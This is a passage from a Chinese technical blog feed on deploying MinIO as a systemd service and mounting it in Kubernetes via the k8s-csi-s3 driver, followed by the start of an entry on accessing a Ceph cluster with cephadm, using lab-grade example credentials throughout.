<span class="hljs-keyword">Object</span> <span class="hljs-keyword">Storage</span> <span class="hljs-keyword">Server</span><br>Copyright: <span class="hljs-number">2015</span><span class="hljs-number">-2025</span> MinIO, Inc.<br>License: GNU AGPLv3 - https://www.gnu.org/licenses/agpl<span class="hljs-number">-3.0</span>.html<br><span class="hljs-keyword">Version</span>: <span class="hljs-keyword">RELEASE</span><span class="hljs-number">.2025</span><span class="hljs-number">-01</span><span class="hljs-number">-18</span>T00<span class="hljs-number">-31</span><span class="hljs-number">-37</span>Z (go1<span class="hljs-number">.23</span><span class="hljs-number">.5</span> linux/amd64)<br><br>API: http://<span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.12</span>:<span class="hljs-number">9000</span>  http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">9000</span> <br>   RootUser: minioadmin <br>   RootPass: minioadmin <br><br>WebUI: http://<span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.12</span>:<span class="hljs-number">9099</span> http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">9099</span>   <br>   RootUser: minioadmin <br>   RootPass: minioadmin <br><br>CLI: https://min.io/docs/minio/linux/reference/minio-mc.html#quickstart<br>   $ mc <span class="hljs-keyword">alias</span> <span class="hljs-keyword">set</span> <span class="hljs-string">&#x27;myminio&#x27;</span> <span class="hljs-string">&#x27;http://10.0.0.12:9000&#x27;</span> <span class="hljs-string">&#x27;minioadmin&#x27;</span> <span class="hljs-string">&#x27;minioadmin&#x27;</span><br><br>Docs: https://docs.min.io<br>WARN: Detected <span class="hljs-keyword">default</span> credentials <span class="hljs-string">&#x27;minioadmin:minioadmin&#x27;</span>, we recommend that you change these <span class="hljs-keyword">values</span> <span class="hljs-keyword">with</span> <span class="hljs-string">&#x27;MINIO_ROOT_USER&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;MINIO_ROOT_PASSWORD&#x27;</span> environment variables<br></code></pre></td></tr></table></figure><p>其中 <code>/data</code> 是用于存储 MinIO 数据的目录，<code>--console-address &quot;:9099&quot;</code> 是指定 MinIO Web 控制台的监听地址为端口 <code>9099</code>。</p><h3 id="1-访问"><a href="#1-访问" class="headerlink" title="1.访问"></a><strong>1.访问</strong></h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//10.0.0.12:9099</span><br>账号：minioadmin <br>密码：minioadmin<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/d99c83c9e3b54dbe9715249bf668cba2.png" alt="img"></p><h3 id="2-配置自启动服务"><a href="#2-配置自启动服务" class="headerlink" title="2.配置自启动服务"></a>2.配置自启动服务</h3><p>为简化MinIO配置，我们可将MinIO的配置统一写入一个配置文件，以供启动时调用。配置方式如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[root@minio ~]</span><span class="hljs-comment"># vim /etc/default/minio</span><br><span class="hljs-comment"># 指定数据存储目录(注意：这个目录要存在且拥有相对应的权限)</span><br><span class="hljs-attr">MINIO_VOLUMES</span>=<span class="hljs-string">&quot;/data&quot;</span><br><br><span class="hljs-comment"># 监听端口</span><br><span class="hljs-attr">MINIO_OPTS</span>=<span class="hljs-string">&quot;--address :9000 --console-address :9099&quot;</span><br><br><span class="hljs-comment"># 老版本使用MINIO_ACCESS_KEY/MINIO_SECRET_KEY，新版本已不建议使用</span><br><span class="hljs-comment"># Access key (账号)</span><br><span class="hljs-comment"># MINIO_ACCESS_KEY=&quot;minioadmin&quot;</span><br><span class="hljs-comment"># Secret key (密码)</span><br><span class="hljs-comment"># MINIO_SECRET_KEY=&quot;minioadmin&quot;</span><br><br><span class="hljs-comment"># 新版本使用；指定默认的用户名和密码，其中用户名必须大于3个字母，否则不能启动</span><br><span class="hljs-attr">MINIO_ROOT_USER</span>=<span class="hljs-string">&quot;minioadmin&quot;</span><br><span class="hljs-attr">MINIO_ROOT_PASSWORD</span>=<span class="hljs-string">&quot;minioadmin666&quot;</span><br><br><span class="hljs-comment"># 区域值，标准格式是“国家-区域-编号”，</span><br><span class="hljs-attr">MINIO_REGION</span>=<span class="hljs-string">&quot;cn-north-1&quot;</span><br><br><span class="hljs-comment"># 域名</span><br><span class="hljs-comment"># MINIO_DOMAIN=minio.your_domain.com</span><br></code></pre></td></tr></table></figure><h3 id="3-编写服务文件"><a href="#3-编写服务文件" class="headerlink" title="3.编写服务文件"></a>3.编写服务文件</h3><p>创建minio.service服务文件，并写入配置信息：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[root@minio ~]</span><span class="hljs-comment"># vim /usr/lib/systemd/system/minio.service</span><br><span class="hljs-section">[Unit]</span><br><span class="hljs-attr">Description</span>=MinIO<br><span class="hljs-attr">Documentation</span>=https://docs.min.io<br><span class="hljs-attr">Wants</span>=network-<span class="hljs-literal">on</span>line.target<br><span class="hljs-attr">After</span>=network-<span class="hljs-literal">on</span>line.target<br><span class="hljs-attr">AssertFileIsExecutable</span>=/usr/local/bin/minio<br><span class="hljs-section">[Service]</span><br><span class="hljs-attr">WorkingDirectory</span>=/usr/local/<br><br><span class="hljs-attr">ProtectProc</span>=invisible<br><br><span class="hljs-comment"># 指向3.1节中的配置文件</span><br><span class="hljs-comment">#EnvironmentFile=/etc/default/minio</span><br><span class="hljs-attr">EnvironmentFile</span>=-/etc/default/minio<br><br><span class="hljs-attr">ExecStartPre</span>=/bin/bash -c <span class="hljs-string">&quot;if [ -z \&quot;$&#123;MINIO_VOLUMES&#125;\&quot; ]; then echo \&quot;Variable MINIO_VOLUMES not set in /etc/default/minio\&quot;; exit 1; fi&quot;</span><br><span class="hljs-attr">ExecStart</span>=/usr/local/bin/minio server <span class="hljs-variable">$MINIO_OPTS</span> <span class="hljs-variable">$MINIO_VOLUMES</span><br><br><span class="hljs-comment"># Let systemd restart this service always</span><br><span class="hljs-attr">Restart</span>=always<br><br><span class="hljs-comment"># Specifies the maximum (1M) file descriptor number that can be opened by this process</span><br><span class="hljs-attr">LimitNOFILE</span>=<span class="hljs-number">1048576</span><br><br><span class="hljs-comment"># Specifies the maximum number of threads this process can create</span><br><span class="hljs-attr">TasksMax</span>=infinity<br><br><span class="hljs-comment"># Disable timeout logic and wait until process is stopped</span><br><span class="hljs-attr">TimeoutStopSec</span>=infinity<br><span class="hljs-attr">SendSIGKILL</span>=<span class="hljs-literal">no</span><br><span class="hljs-attr">SuccessExitStatus</span>=<span class="hljs-number">0</span><br><br><span class="hljs-section">[Install]</span><br><span class="hljs-attr">WantedBy</span>=multi-user.target<br><span class="hljs-attr">Alias</span>=minio.service<br></code></pre></td></tr></table></figure><p><strong>使服务生效</strong></p><p>通过systemctl将服务生效并启动服务。</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-comment"># 重新加载服务配置文件，使服务生效</span><br><span class="hljs-params">system</span>ctl daemon-reload<br><br><span class="hljs-comment"># 将服务设置为开机启动</span><br><span class="hljs-params">system</span>ctl enable minio<br><br><span class="hljs-comment"># 服务立即启动</span><br><span class="hljs-params">system</span>ctl start minio<br><br><span class="hljs-comment"># 查看minio服务当前状态</span><br><span class="hljs-params">system</span>ctl status minio<br></code></pre></td></tr></table></figure><p>重新登录</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//10.0.0.12:9099</span><br>账号：minioadmin <br>密码：minioadmin666<br></code></pre></td></tr></table></figure><p>如果起不来可以查看日志排查</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@minio</span> ~]<span class="hljs-meta"># journalctl -u minio -f </span><br></code></pre></td></tr></table></figure><h1 id="四、minio集成k8s"><a href="#四、minio集成k8s" class="headerlink" title="四、minio集成k8s"></a>四、minio集成k8s</h1><p>MinIO控制台提供了一个图形用户界面（GUI），用于与MinIO租户进行交互。默认情况下，MinIO操作员为每个租户安装和配置控制台。</p><p>参考地址：<a href="https://github.com/yandex-cloud/k8s-csi-s3">https://github.com/yandex-cloud/k8s-csi-s3</a></p><p>下载资源包</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs crystal">[root<span class="hljs-variable">@master231</span> kubernetes]<span class="hljs-comment"># pwd </span><br><span class="hljs-regexp">/opt/k</span>8s-csi-s3-<span class="hljs-number">0.35</span>.<span class="hljs-number">5</span>/deploy/kubernetes<br><br>[root<span class="hljs-variable">@master231</span> kubernetes]<span class="hljs-comment"># tree ./</span><br>./<br>├── attacher.yaml<br>├── csi-s3.yaml<br>├── examples<br>│   ├── pod.yaml<br>│   ├── pvc-manual.yaml<br>│   ├── pvc.yaml<br>│   ├── secret.yaml<br>│   └── storageclass.yaml<br>└── provisioner.yaml<br><br><span class="hljs-number">1</span> directory, <span class="hljs-number">8</span> files<br></code></pre></td></tr></table></figure><p><strong>部署driver</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">cd</span> deploy/kubernetes<br>kubectl create <span class="hljs-operator">-f</span> provisioner.yaml<br>kubectl create <span class="hljs-operator">-f</span> driver.yaml<br>kubectl create <span class="hljs-operator">-f</span> csi<span class="hljs-literal">-s3</span>.yaml<br></code></pre></td></tr></table></figure><p><strong>查看</strong></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/56830496c9b84e6c8ed0b49c37b734bb.png" alt="img"></p><p><strong>创建存储类</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs yaml">[<span class="hljs-string">root@master231</span> <span class="hljs-string">examples</span>]<span class="hljs-comment"># vim storageclass.yaml </span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">StorageClass</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">storage.k8s.io/v1</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">csi-s3</span><br><span class="hljs-attr">provisioner:</span> <span class="hljs-string">ru.yandex.s3.csi</span><br><span class="hljs-attr">parameters:</span><br>  <span class="hljs-attr">mounter:</span> <span class="hljs-string">geesefs</span><br>  <span class="hljs-comment"># you can set mount options here, for example limit memory cache size (recommended)</span><br>  <span class="hljs-attr">options:</span> <span class="hljs-string">&quot;--memory-limit 1000 --dir-mode 0777 --file-mode 0666&quot;</span><br>  <span class="hljs-comment"># to use an existing bucket, specify it here:</span><br>  <span class="hljs-comment">#bucket: some-existing-bucket</span><br>  <span class="hljs-attr">csi.storage.k8s.io/provisioner-secret-name:</span> <span class="hljs-string">csi-s3-secret</span><br>  <span class="hljs-attr">csi.storage.k8s.io/provisioner-secret-namespace:</span> <span class="hljs-string">kube-system</span><br>  <span class="hljs-attr">csi.storage.k8s.io/controller-publish-secret-name:</span> <span class="hljs-string">csi-s3-secret</span><br>  <span class="hljs-attr">csi.storage.k8s.io/controller-publish-secret-namespace:</span> <span class="hljs-string">kube-system</span><br>  <span class="hljs-attr">csi.storage.k8s.io/node-stage-secret-name:</span> <span class="hljs-string">csi-s3-secret</span><br>  <span class="hljs-attr">csi.storage.k8s.io/node-stage-secret-namespace:</span> <span class="hljs-string">kube-system</span><br>  <span class="hljs-attr">csi.storage.k8s.io/node-publish-secret-name:</span> <span class="hljs-string">csi-s3-secret</span><br>  <span class="hljs-attr">csi.storage.k8s.io/node-publish-secret-namespace:</span> <span class="hljs-string">kube-system</span><br>  <br>[<span class="hljs-string">root@master231</span> <span class="hljs-string">examples</span>]<span class="hljs-comment"># kubectl apply -f storageclass.yaml </span><br></code></pre></td></tr></table></figure><h3 id="1-模拟生成环境测试"><a href="#1-模拟生成环境测试" class="headerlink" title="1.模拟生成环境测试"></a><strong>1.模拟生成环境测试</strong></h3><p><strong>创建pvc</strong></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs dts">[root@master231 examples]<span class="hljs-meta"># cat pvc.yaml</span><br><span class="hljs-symbol">apiVersion:</span> v1<br><span class="hljs-symbol">kind:</span> PersistentVolumeClaim<br><span class="hljs-symbol">metadata:</span><br><span class="hljs-symbol">  name:</span> csi-s3-pvc<br><span class="hljs-symbol">  namespace:</span> default<br><span class="hljs-symbol">spec:</span><br><span class="hljs-symbol">  accessModes:</span><br>  - ReadWriteMany<br><span class="hljs-symbol">  resources:</span><br><span class="hljs-symbol">    requests:</span><br><span class="hljs-symbol">      storage:</span> <span class="hljs-number">5</span>Gi<br><span class="hljs-symbol">  storageClassName:</span> csi-s3<br>  <br>[root@master231 examples]<span class="hljs-meta"># kubectl apply -f pvc.yaml </span><br></code></pre></td></tr></table></figure><p><strong>创建pod</strong></p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs nix">[root@master231 examples]<span class="hljs-comment"># cat pod.yaml </span><br><span class="hljs-params">apiVersion:</span> v1<br><span class="hljs-params">kind:</span> Pod<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> csi-s3-test-nginx<br>  <span class="hljs-params">namespace:</span> default<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">containers:</span><br>   <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> csi-s3-test-nginx<br>     <span class="hljs-params">image:</span> nginx<br>     <span class="hljs-params">volumeMounts:</span><br>       <span class="hljs-operator">-</span> <span class="hljs-params">mountPath:</span> <span class="hljs-symbol">/usr/share/nginx/html/s3</span><br>         <span class="hljs-params">name:</span> webroot<br>  <span class="hljs-params">volumes:</span><br>   <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> webroot<br>     <span class="hljs-params">persistentVolumeClaim:</span><br>       <span class="hljs-params">claimName:</span> csi-s3-pvc<br>       <span class="hljs-params">readOnly:</span> <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p><strong>创建secret</strong></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dts">[root@master231 examples]<span class="hljs-meta"># cat secret.yaml </span><br><span class="hljs-symbol">apiVersion:</span> v1<br><span class="hljs-symbol">kind:</span> Secret<br><span class="hljs-symbol">metadata:</span><br><span class="hljs-symbol">  namespace:</span> kube-system<br><span class="hljs-symbol">  name:</span> csi-s3-secret<br><span class="hljs-symbol">stringData:</span><br><span class="hljs-symbol">  accessKeyID:</span> minioadmin<br><span class="hljs-symbol">  secretAccessKey:</span> minioadmin666<br>  <span class="hljs-meta">#填写minio api接口地址</span><br><span class="hljs-symbol">  endpoint:</span> http:<span class="hljs-comment">//10.0.0.12:9000  </span><br>  <span class="hljs-meta"># For AWS set it to AWS region</span><br>  <span class="hljs-meta">#region: <span class="hljs-string">&quot;&quot;</span></span><br></code></pre></td></tr></table></figure><p> <strong>检查pv,pvc,sc,pod状态</strong></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/4e28afc200f2413687d45a788078a5ae.png" alt="img"></p><p><strong>写入数据</strong></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/637c135105f44604ac8ba1c2ff526070.png" alt="img"></p><p><strong>minio web界面查看是否写入成功</strong></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/5b7bb21d10a946bbbb18cfc0f6014bb7.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>存储篇</category>
      
    </categories>
    
    
    <tags>
      
      <tag>k8s</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ceph新增节点，OSD设备，标签管理（二）</title>
    <link href="/2025/04/18/ceph%E6%96%B0%E5%A2%9E%E8%8A%82%E7%82%B9%EF%BC%8COSD%E8%AE%BE%E5%A4%87%EF%BC%8C%E6%A0%87%E7%AD%BE%E7%AE%A1%E7%90%86%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2025/04/18/ceph%E6%96%B0%E5%A2%9E%E8%8A%82%E7%82%B9%EF%BC%8COSD%E8%AE%BE%E5%A4%87%EF%BC%8C%E6%A0%87%E7%AD%BE%E7%AE%A1%E7%90%86%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="一、访问客户端集群方式"><a href="#一、访问客户端集群方式" class="headerlink" title="一、访问客户端集群方式"></a>一、访问客户端集群方式</h2><p>方式一: 使用cephadm shell交互式配置</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs awk">[root@ceph141 ~]<span class="hljs-comment"># cephadm shell    # 注意，此命令会启动一个新的容器，运行玩后会退出！</span><br>Inferring fsid c153209c-d8a0-<span class="hljs-number">11</span>ef-a0ed-bdb84668ed01<br>Inferring config <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/ceph/</span>c153209c-d8a0-<span class="hljs-number">11</span>ef-a0ed-bdb84668ed01<span class="hljs-regexp">/mon.ceph141/</span>config<br>Using ceph image with id <span class="hljs-string">&#x27;2bc0b0f4375d&#x27;</span> and tag <span class="hljs-string">&#x27;v18&#x27;</span> created on <span class="hljs-number">2024</span>-<span class="hljs-number">07</span>-<span class="hljs-number">24</span> <span class="hljs-number">06</span>:<span class="hljs-number">19</span>:<span class="hljs-number">35</span> +<span class="hljs-number">0800</span> CST<br>quay.io<span class="hljs-regexp">/ceph/</span>ceph@sha256:<span class="hljs-number">6</span>ac7f923aa1d23b43248ce0ddec7e1388855ee3d00813b52c3172b0b23b37906<br>root@ceph141:/<span class="hljs-comment"># ceph -s</span><br>  cluster:<br>    id:     c153209c-d8a0-<span class="hljs-number">11</span>ef-a0ed-bdb84668ed01<br>    health: HEALTH_WARN<br>            mon ceph141 is low on available space<br>            OSD count <span class="hljs-number">0</span> &lt; osd_pool_default_size <span class="hljs-number">3</span><br> <br>  services:<br>    mon: <span class="hljs-number">1</span> daemons, quorum ceph141 (age <span class="hljs-number">17</span>h)<br>    mgr: ceph141.iphxbv(active, since <span class="hljs-number">17</span>h)<br>    osd: <span class="hljs-number">0</span> osds: <span class="hljs-number">0</span> up, <span class="hljs-number">0</span> <span class="hljs-keyword">in</span><br> <br>  data:<br>    pools:   <span class="hljs-number">0</span> pools, <span class="hljs-number">0</span> pgs<br>    objects: <span class="hljs-number">0</span> objects, <span class="hljs-number">0</span> B<br>    usage:   <span class="hljs-number">0</span> B used, <span class="hljs-number">0</span> B / <span class="hljs-number">0</span> B avail<br>    pgs:     <br> <br>root@ceph141:/<span class="hljs-comment"># exit</span><br><span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p>方式二: 使用cephadm非交互式配置，依旧会启动容器，运行玩后会退出！</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs nix">[root@ceph141 ~]<span class="hljs-comment"># cephadm shell -- ceph -s</span><br>Inferring fsid c153209c-d8a0-<span class="hljs-number">11</span>ef-a0ed-bdb84668ed01<br>Inferring config <span class="hljs-symbol">/var/lib/ceph/c153209c-d8a0-11ef-a0ed-bdb84668ed01/mon.ceph141/config</span><br>Using ceph image <span class="hljs-keyword">with</span> id &#x27;<span class="hljs-number">2</span>bc0b0f4375d&#x27; and tag &#x27;v18&#x27; created on <span class="hljs-number">202</span>4-<span class="hljs-number">0</span>7-<span class="hljs-number">24</span> <span class="hljs-number">06</span>:<span class="hljs-number">19</span>:<span class="hljs-number">35</span> <span class="hljs-operator">+</span><span class="hljs-number">0800</span> CST<br>quay.io<span class="hljs-operator">/</span>ceph<span class="hljs-operator">/</span>ceph@sha256:<span class="hljs-number">6</span>ac7f923aa1d23b43248ce0ddec7e1388855ee3d00813b52c3172b0b23b37906<br>  <span class="hljs-params">cluster:</span><br>    <span class="hljs-params">id:</span>     c153209c-d8a0-<span class="hljs-number">11</span>ef-a0ed-bdb84668ed01<br>    <span class="hljs-params">health:</span> HEALTH_WARN<br>            mon ceph141 is low on available space<br>            OSD count <span class="hljs-number">0</span> <span class="hljs-operator">&lt;</span> osd_pool_default_size <span class="hljs-number">3</span><br> <br>  <span class="hljs-params">services:</span><br>    <span class="hljs-params">mon:</span> <span class="hljs-number">1</span> daemons, quorum ceph141 (age <span class="hljs-number">17</span>h)<br>    <span class="hljs-params">mgr:</span> ceph141.iphxbv(active, since <span class="hljs-number">17</span>h)<br>    <span class="hljs-params">osd:</span> <span class="hljs-number">0</span> <span class="hljs-params">osds:</span> <span class="hljs-number">0</span> up, <span class="hljs-number">0</span> <span class="hljs-keyword">in</span><br> <br>  <span class="hljs-params">data:</span><br>    <span class="hljs-params">pools:</span>   <span class="hljs-number">0</span> pools, <span class="hljs-number">0</span> pgs<br>    <span class="hljs-params">objects:</span> <span class="hljs-number">0</span> objects, <span class="hljs-number">0</span> B<br>    <span class="hljs-params">usage:</span>   <span class="hljs-number">0</span> B used, <span class="hljs-number">0</span> B <span class="hljs-symbol">/</span> <span class="hljs-number">0</span> B avail<br>    pgs:<br></code></pre></td></tr></table></figure><p>方式三: 安装ceph通用包，其中包含所有ceph命令，包括ceph、rbd、mount.ceph（用于挂载CephFS文件系统）等【推荐使用】</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs nix">[root@ceph141 ~]<span class="hljs-comment"># cephadm add-repo --release reef # 配置本地的apt源</span><br>[root@ceph141 ~]<span class="hljs-comment"># cephadm install ceph-common     # 此步骤，相当于apt -y install ceph-common</span><br>Installing packages [&#x27;ceph-common&#x27;]...<br>[root@ceph141 ~]<span class="hljs-comment"># ceph -s </span><br>  <span class="hljs-params">cluster:</span><br>    <span class="hljs-params">id:</span>     c153209c-d8a0-<span class="hljs-number">11</span>ef-a0ed-bdb84668ed01<br>    <span class="hljs-params">health:</span> HEALTH_WARN<br>            mon ceph141 is low on available space<br>            OSD count <span class="hljs-number">0</span> <span class="hljs-operator">&lt;</span> osd_pool_default_size <span class="hljs-number">3</span><br> <br>  <span class="hljs-params">services:</span><br>    <span class="hljs-params">mon:</span> <span class="hljs-number">1</span> daemons, quorum ceph141 (age <span class="hljs-number">17</span>h)<br>    <span class="hljs-params">mgr:</span> ceph141.iphxbv(active, since <span class="hljs-number">17</span>h)<br>    <span class="hljs-params">osd:</span> <span class="hljs-number">0</span> <span class="hljs-params">osds:</span> <span class="hljs-number">0</span> up, <span class="hljs-number">0</span> <span class="hljs-keyword">in</span><br> <br>  <span class="hljs-params">data:</span><br>    <span class="hljs-params">pools:</span>   <span class="hljs-number">0</span> pools, <span class="hljs-number">0</span> pgs<br>    <span class="hljs-params">objects:</span> <span class="hljs-number">0</span> objects, <span class="hljs-number">0</span> B<br>    <span class="hljs-params">usage:</span>   <span class="hljs-number">0</span> B used, <span class="hljs-number">0</span> B <span class="hljs-symbol">/</span> <span class="hljs-number">0</span> B avail<br>    pgs:<br></code></pre></td></tr></table></figure><p><strong>基于命令行的方式修改ceph的dashboard的密码</strong></p><p>修改admin的密码为1</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown">[root@ceph141 ~]# echo 1 | ceph dashboard set-login-credentials admin -i -<br><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span>**<br><span class="hljs-strong">***          WARNING: this command is deprecated.              **</span>*<br><span class="hljs-strong">*** Please use the ac-user-* related commands to manage users. **</span>*<br><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span>**<br>Username and password 